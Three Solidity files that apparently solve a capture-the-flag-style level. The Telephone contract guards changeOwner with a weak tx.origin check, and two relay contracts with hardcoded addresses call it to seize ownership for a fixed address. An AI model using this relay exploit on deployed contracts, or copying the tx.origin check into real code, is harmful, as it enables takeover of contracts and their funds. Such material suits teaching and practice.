// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "TelephoneCallOne.sol";

contract CallOne {

	CallTwo public TargetContract = CallTwo(0x653CC6851b42d8Fe67E9E7D18979765E83E6AD2b); // 

    function call() public {
        TargetContract.call();
    } 
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "Telephone.sol";

contract CallTwo {

	Telephone public TargetContract = Telephone(0x3F5A7376b42F0BaAFf4157b50b9a1893aae211Cb); // Telephone contract

    function call() public {
        TargetContract.changeOwner(0x733990D97D7c5237FFE92A98d729b6dfba72D656);
    } 
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

	address public owner;

	constructor() public {
		owner = msg.sender;
	}

	function changeOwner(address _owner) public {
		if (tx.origin != msg.sender) {
			owner = _owner;
		}
	}
}